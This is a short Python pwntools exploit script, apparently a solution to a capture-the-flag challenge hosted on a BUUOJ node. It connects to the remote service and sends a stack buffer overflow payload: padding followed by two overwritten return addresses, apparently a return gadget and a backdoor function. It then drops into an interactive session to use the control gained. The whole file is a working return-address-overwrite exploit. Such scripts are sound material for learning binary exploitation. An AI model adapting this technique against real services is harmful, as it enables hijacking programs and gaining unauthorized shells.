from pwn import * 
from pwn import p64


debug = 0
gdb_is = 0
# context(arch='i386',os = 'linux', log_level='DEBUG')
context(arch='amd64',os = 'linux', log_level='DEBUG')
if debug:
    context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
    r = process("./pwn")
else:
    host = "node4.buuoj.cn"
    r = connect(host,27219)#远程连接
    gdb_is =0

if gdb_is:
    gdb.attach(r,'b* 0x4007a2')
    # gdb.attach(r)
    pause()
    pass

# libc = ELF('./libc-2.31.so')
# elf = ELF('./vuln')

r.sendlineafter(b'name:',b'100')
payload = b'A'*0x10 + b'junkjunk' +p64(0x0400561) +p64(0x04006E6)
r.sendafter(b'name?',payload)

r.interactive()
